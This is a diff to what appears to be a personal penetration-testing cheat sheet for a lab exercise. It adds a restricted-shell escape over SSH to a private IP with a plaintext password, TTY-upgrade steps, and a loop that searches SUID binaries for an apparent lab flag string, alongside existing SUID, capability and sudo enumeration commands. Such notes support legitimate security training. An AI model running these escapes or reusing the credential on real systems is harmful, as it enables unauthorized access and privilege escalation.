@@ -12,6 +12,36 @@
 
 <https://github.com/carlospolop/PEASS-ng>
 
+## full shell
+
+### rbash bypass
+
+```bash
+ssh mindy@172.16.33.35 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+P@55W0rd1!2@
+```
+
+### full pty
+
+```bash
+bash
+
+stty -a
+speed 38400 baud; rows 48; columns 176; line = 0;
+
+control + z
+stty raw -echo
+fg
+```
+
+if use rbash bypass to get a ssh shell, we get a full pty now!!! and don't need to use the following command.
+
+```bash
+export SHELL=bash
+export TERM=xterm
+stty rows 48 columns 176
+```
+
 ## general
 
 - 发行版/内核
@@ -54,6 +84,7 @@ find / --witeable -type f -user root -perm -u=x 2>/dev/null
 
 ```bash
 find / -perm -u=s -type f 2>/dev/null
+for i in $(find / -perm -u=s -type f 2>/dev/null); do strings $i 2>/dev/null | grep -i "OS{"; done
 ```
 
 ## capability
@@ -67,5 +98,3 @@ getcap -r / 2>/dev/null
 ```bash
 sudo -l
 ```
-
-
